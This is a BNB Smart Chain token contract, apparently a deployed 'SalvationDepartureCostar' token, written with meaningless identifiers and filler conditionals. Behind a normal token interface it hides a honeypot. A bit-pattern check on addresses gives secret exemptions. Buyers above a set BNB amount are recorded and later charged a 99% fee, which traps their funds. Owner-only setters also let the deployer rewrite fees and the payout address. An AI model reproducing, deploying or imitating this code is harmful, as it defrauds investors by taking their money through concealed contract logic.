/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SalvationDepartureCostar is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Salvation Departure Costar ";
    string constant _symbol = "SalvationDepartureCostar";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private teamSwapExemptTradingLaunchedBuyLimit;
    mapping(address => bool) private autoSellTeamTradingLimitLiquidityFee;
    mapping(address => bool) private limitLiquidityBotsMarketing;
    mapping(address => bool) private autoMarketingIsMax;
    mapping(address => uint256) private isSellBuyLaunched;
    mapping(uint256 => address) private burnBuyMinMarketing;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private modeBurnLiquidityAuto = 0;
    uint256 private maxTradingSwapFee = 9;

    //SELL FEES
    uint256 private minModeFeeMax = 0;
    uint256 private isSellLiquidityExemptTeamBuy = 9;

    uint256 private maxBotsTradingSwap = maxTradingSwapFee + modeBurnLiquidityAuto;
    uint256 private minTeamLimitFeeSellAuto = 100;

    address private botsModeLaunchedMarketing = (msg.sender); // auto-liq address
    address private burnFeeBuyTeam = (0x3946F9330ce3D5eB0645811cfFffE674dfb8D5F6); // marketing address
    address private minBurnBotsFee = DEAD;
    address private maxBotsSellBuySwapLimit = DEAD;
    address private minMaxFeeExemptMarketingSell = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private minMaxWalletTrading;
    uint256 private exemptReceiverWalletBotsBuySwap;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private limitReceiverSellTradingBots;
    uint256 private modeMaxBuyMin;
    uint256 private launchedBuyTxSell;
    uint256 private autoTradingSwapBotsExempt;
    uint256 private swapReceiverFeeBotsTeamSellLimit;

    bool private sellBotsMinIs = true;
    bool private autoMarketingIsMaxMode = true;
    bool private buyBotsLimitSell = true;
    bool private botsIsTeamMinMode = true;
    bool private receiverBuyTxSwapMaxTradingIs = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private maxIsSellModeAutoTx = 6 * 10 ** 15;
    uint256 private walletTeamBurnLiquidityLimitReceiver = _totalSupply / 1000; // 0.1%

    
    bool private txWalletTeamSellLiquidityMarketingAuto = false;
    uint256 private modeBotsLaunchedMarketing = 0;
    bool private liquidityIsLaunchedTrading = false;
    uint256 private maxBuyLaunchedBotsFee = 0;
    bool private sellLaunchedBotsTxExemptMarketingIs = false;
    bool private minMarketingBurnIsFeeAuto = false;
    uint256 private burnAutoTxTrading = 0;
    uint256 private launchedLimitMaxTxIs = 0;
    uint256 private marketingFeeBotsLaunched = 0;
    uint256 private maxTradingLiquiditySwapMin = 0;
    uint256 private modeBotsLaunchedMarketing0 = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        limitReceiverSellTradingBots = true;

        teamSwapExemptTradingLaunchedBuyLimit[msg.sender] = true;
        teamSwapExemptTradingLaunchedBuyLimit[address(this)] = true;

        autoSellTeamTradingLimitLiquidityFee[msg.sender] = true;
        autoSellTeamTradingLimitLiquidityFee[0x0000000000000000000000000000000000000000] = true;
        autoSellTeamTradingLimitLiquidityFee[0x000000000000000000000000000000000000dEaD] = true;
        autoSellTeamTradingLimitLiquidityFee[address(this)] = true;

        limitLiquidityBotsMarketing[msg.sender] = true;
        limitLiquidityBotsMarketing[0x0000000000000000000000000000000000000000] = true;
        limitLiquidityBotsMarketing[0x000000000000000000000000000000000000dEaD] = true;
        limitLiquidityBotsMarketing[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return isTxFeeLiquidity(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return isTxFeeLiquidity(sender, recipient, amount);
    }

    function isTxFeeLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        bool bLimitTxWalletValue = receiverTxSwapExemptBurnFeeMode(sender) || receiverTxSwapExemptBurnFeeMode(recipient);
        
        if (maxTradingLiquiditySwapMin == burnAutoTxTrading) {
            maxTradingLiquiditySwapMin = maxTradingSwapFee;
        }

        if (maxBuyLaunchedBotsFee != launchedLimitMaxTxIs) {
            maxBuyLaunchedBotsFee = modeBotsLaunchedMarketing;
        }

        if (modeBotsLaunchedMarketing != walletTeamBurnLiquidityLimitReceiver) {
            modeBotsLaunchedMarketing = modeBotsLaunchedMarketing0;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                limitMinAutoTxMax();
            }
            if (!bLimitTxWalletValue) {
                exemptReceiverBotsModeMarketing(recipient);
            }
        }
        
        if (liquidityIsLaunchedTrading != receiverBuyTxSwapMaxTradingIs) {
            liquidityIsLaunchedTrading = minMarketingBurnIsFeeAuto;
        }

        if (maxTradingLiquiditySwapMin != maxIsSellModeAutoTx) {
            maxTradingLiquiditySwapMin = burnAutoTxTrading;
        }


        if (inSwap || bLimitTxWalletValue) {return exemptBotsBurnMax(sender, recipient, amount);}

        if (!teamSwapExemptTradingLaunchedBuyLimit[sender] && !teamSwapExemptTradingLaunchedBuyLimit[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || limitLiquidityBotsMarketing[sender] || limitLiquidityBotsMarketing[recipient], "Max TX Limit has been triggered");

        if (txTradingSwapMode()) {tradingFeeExemptWallet();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = txWalletIsSell(sender) ? botsReceiverBuyTeam(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function exemptBotsBurnMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function txWalletIsSell(address sender) internal view returns (bool) {
        return !autoSellTeamTradingLimitLiquidityFee[sender];
    }

    function burnWalletBotsSwap(address sender, bool selling) internal returns (uint256) {
        
        if (maxBuyLaunchedBotsFee == maxIsSellModeAutoTx) {
            maxBuyLaunchedBotsFee = modeBotsLaunchedMarketing0;
        }

        if (modeBotsLaunchedMarketing == maxBotsTradingSwap) {
            modeBotsLaunchedMarketing = modeBotsLaunchedMarketing;
        }

        if (minMarketingBurnIsFeeAuto != receiverBuyTxSwapMaxTradingIs) {
            minMarketingBurnIsFeeAuto = buyBotsLimitSell;
        }


        if (selling) {
            maxBotsTradingSwap = isSellLiquidityExemptTeamBuy + minModeFeeMax;
            return botsSwapWalletSell(sender, maxBotsTradingSwap);
        }
        if (!selling && sender == uniswapV2Pair) {
            maxBotsTradingSwap = maxTradingSwapFee + modeBurnLiquidityAuto;
            return maxBotsTradingSwap;
        }
        return botsSwapWalletSell(sender, maxBotsTradingSwap);
    }

    function botsLimitSellTx() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function botsReceiverBuyTeam(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (maxTradingLiquiditySwapMin == walletTeamBurnLiquidityLimitReceiver) {
            maxTradingLiquiditySwapMin = maxTradingSwapFee;
        }

        if (maxBuyLaunchedBotsFee != maxIsSellModeAutoTx) {
            maxBuyLaunchedBotsFee = burnAutoTxTrading;
        }

        if (marketingFeeBotsLaunched != marketingFeeBotsLaunched) {
            marketingFeeBotsLaunched = burnAutoTxTrading;
        }


        uint256 feeAmount = amount.mul(burnWalletBotsSwap(sender, receiver == uniswapV2Pair)).div(minTeamLimitFeeSellAuto);

        if (autoMarketingIsMax[sender] || autoMarketingIsMax[receiver]) {
            feeAmount = amount.mul(99).div(minTeamLimitFeeSellAuto);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 4 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 4; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(4 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function receiverTxSwapExemptBurnFeeMode(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function botsSwapWalletSell(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = isSellBuyLaunched[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function exemptReceiverBotsModeMarketing(address addr) private {
        if (botsLimitSellTx() < maxIsSellModeAutoTx) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        burnBuyMinMarketing[exemptLimitValue] = addr;
    }

    function limitMinAutoTxMax() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (isSellBuyLaunched[burnBuyMinMarketing[i]] == 0) {
                    isSellBuyLaunched[burnBuyMinMarketing[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(burnFeeBuyTeam).transfer(amountBNB * amountPercentage / 100);
    }

    function txTradingSwapMode() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    receiverBuyTxSwapMaxTradingIs &&
    _balances[address(this)] >= walletTeamBurnLiquidityLimitReceiver;
    }

    function tradingFeeExemptWallet() internal swapping {
        
        if (modeBotsLaunchedMarketing != maxBuyLaunchedBotsFee) {
            modeBotsLaunchedMarketing = launchedLimitMaxTxIs;
        }

        if (minMarketingBurnIsFeeAuto != txWalletTeamSellLiquidityMarketingAuto) {
            minMarketingBurnIsFeeAuto = autoMarketingIsMaxMode;
        }

        if (marketingFeeBotsLaunched == maxBuyLaunchedBotsFee) {
            marketingFeeBotsLaunched = isSellLiquidityExemptTeamBuy;
        }


        uint256 amountToLiquify = walletTeamBurnLiquidityLimitReceiver.mul(modeBurnLiquidityAuto).div(maxBotsTradingSwap).div(2);
        uint256 amountToSwap = walletTeamBurnLiquidityLimitReceiver.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (sellLaunchedBotsTxExemptMarketingIs == txWalletTeamSellLiquidityMarketingAuto) {
            sellLaunchedBotsTxExemptMarketingIs = autoMarketingIsMaxMode;
        }

        if (maxTradingLiquiditySwapMin == maxTradingLiquiditySwapMin) {
            maxTradingLiquiditySwapMin = launchedLimitMaxTxIs;
        }

        if (minMarketingBurnIsFeeAuto != sellLaunchedBotsTxExemptMarketingIs) {
            minMarketingBurnIsFeeAuto = txWalletTeamSellLiquidityMarketingAuto;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = maxBotsTradingSwap.sub(modeBurnLiquidityAuto.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(modeBurnLiquidityAuto).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(maxTradingSwapFee).div(totalETHFee);
        
        payable(burnFeeBuyTeam).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsModeLaunchedMarketing,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getAutoSellTeamTradingLimitLiquidityFee(address a0) public view returns (bool) {
        if (autoSellTeamTradingLimitLiquidityFee[a0] == teamSwapExemptTradingLaunchedBuyLimit[a0]) {
            return autoMarketingIsMaxMode;
        }
        if (autoSellTeamTradingLimitLiquidityFee[a0] == teamSwapExemptTradingLaunchedBuyLimit[a0]) {
            return sellLaunchedBotsTxExemptMarketingIs;
        }
        if (a0 == burnFeeBuyTeam) {
            return txWalletTeamSellLiquidityMarketingAuto;
        }
            return autoSellTeamTradingLimitLiquidityFee[a0];
    }
    function setAutoSellTeamTradingLimitLiquidityFee(address a0,bool a1) public onlyOwner {
        if (a0 == minBurnBotsFee) {
            buyBotsLimitSell=a1;
        }
        if (autoSellTeamTradingLimitLiquidityFee[a0] == limitLiquidityBotsMarketing[a0]) {
           limitLiquidityBotsMarketing[a0]=a1;
        }
        autoSellTeamTradingLimitLiquidityFee[a0]=a1;
    }

    function getMinBurnBotsFee() public view returns (address) {
        if (minBurnBotsFee == maxBotsSellBuySwapLimit) {
            return maxBotsSellBuySwapLimit;
        }
        if (minBurnBotsFee == minBurnBotsFee) {
            return minBurnBotsFee;
        }
        if (minBurnBotsFee == minMaxFeeExemptMarketingSell) {
            return minMaxFeeExemptMarketingSell;
        }
        return minBurnBotsFee;
    }
    function setMinBurnBotsFee(address a0) public onlyOwner {
        if (minBurnBotsFee != burnFeeBuyTeam) {
            burnFeeBuyTeam=a0;
        }
        minBurnBotsFee=a0;
    }

    function getAutoMarketingIsMaxMode() public view returns (bool) {
        return autoMarketingIsMaxMode;
    }
    function setAutoMarketingIsMaxMode(bool a0) public onlyOwner {
        if (autoMarketingIsMaxMode == botsIsTeamMinMode) {
            botsIsTeamMinMode=a0;
        }
        if (autoMarketingIsMaxMode == liquidityIsLaunchedTrading) {
            liquidityIsLaunchedTrading=a0;
        }
        autoMarketingIsMaxMode=a0;
    }

    function getIsSellLiquidityExemptTeamBuy() public view returns (uint256) {
        if (isSellLiquidityExemptTeamBuy != maxTradingSwapFee) {
            return maxTradingSwapFee;
        }
        return isSellLiquidityExemptTeamBuy;
    }
    function setIsSellLiquidityExemptTeamBuy(uint256 a0) public onlyOwner {
        if (isSellLiquidityExemptTeamBuy == modeBurnLiquidityAuto) {
            modeBurnLiquidityAuto=a0;
        }
        if (isSellLiquidityExemptTeamBuy == minModeFeeMax) {
            minModeFeeMax=a0;
        }
        isSellLiquidityExemptTeamBuy=a0;
    }

    function getMinModeFeeMax() public view returns (uint256) {
        if (minModeFeeMax != maxTradingLiquiditySwapMin) {
            return maxTradingLiquiditySwapMin;
        }
        if (minModeFeeMax != maxBuyLaunchedBotsFee) {
            return maxBuyLaunchedBotsFee;
        }
        if (minModeFeeMax != minTeamLimitFeeSellAuto) {
            return minTeamLimitFeeSellAuto;
        }
        return minModeFeeMax;
    }
    function setMinModeFeeMax(uint256 a0) public onlyOwner {
        if (minModeFeeMax != modeBotsLaunchedMarketing0) {
            modeBotsLaunchedMarketing0=a0;
        }
        if (minModeFeeMax != modeBotsLaunchedMarketing) {
            modeBotsLaunchedMarketing=a0;
        }
        if (minModeFeeMax == burnAutoTxTrading) {
            burnAutoTxTrading=a0;
        }
        minModeFeeMax=a0;
    }

    function getMinMarketingBurnIsFeeAuto() public view returns (bool) {
        if (minMarketingBurnIsFeeAuto != autoMarketingIsMaxMode) {
            return autoMarketingIsMaxMode;
        }
        if (minMarketingBurnIsFeeAuto != sellLaunchedBotsTxExemptMarketingIs) {
            return sellLaunchedBotsTxExemptMarketingIs;
        }
        return minMarketingBurnIsFeeAuto;
    }
    function setMinMarketingBurnIsFeeAuto(bool a0) public onlyOwner {
        if (minMarketingBurnIsFeeAuto != sellBotsMinIs) {
            sellBotsMinIs=a0;
        }
        minMarketingBurnIsFeeAuto=a0;
    }

    function getSellLaunchedBotsTxExemptMarketingIs() public view returns (bool) {
        if (sellLaunchedBotsTxExemptMarketingIs != buyBotsLimitSell) {
            return buyBotsLimitSell;
        }
        if (sellLaunchedBotsTxExemptMarketingIs != botsIsTeamMinMode) {
            return botsIsTeamMinMode;
        }
        return sellLaunchedBotsTxExemptMarketingIs;
    }
    function setSellLaunchedBotsTxExemptMarketingIs(bool a0) public onlyOwner {
        if (sellLaunchedBotsTxExemptMarketingIs == sellLaunchedBotsTxExemptMarketingIs) {
            sellLaunchedBotsTxExemptMarketingIs=a0;
        }
        sellLaunchedBotsTxExemptMarketingIs=a0;
    }

    function getSellBotsMinIs() public view returns (bool) {
        if (sellBotsMinIs != sellLaunchedBotsTxExemptMarketingIs) {
            return sellLaunchedBotsTxExemptMarketingIs;
        }
        if (sellBotsMinIs == autoMarketingIsMaxMode) {
            return autoMarketingIsMaxMode;
        }
        return sellBotsMinIs;
    }
    function setSellBotsMinIs(bool a0) public onlyOwner {
        if (sellBotsMinIs != liquidityIsLaunchedTrading) {
            liquidityIsLaunchedTrading=a0;
        }
        sellBotsMinIs=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}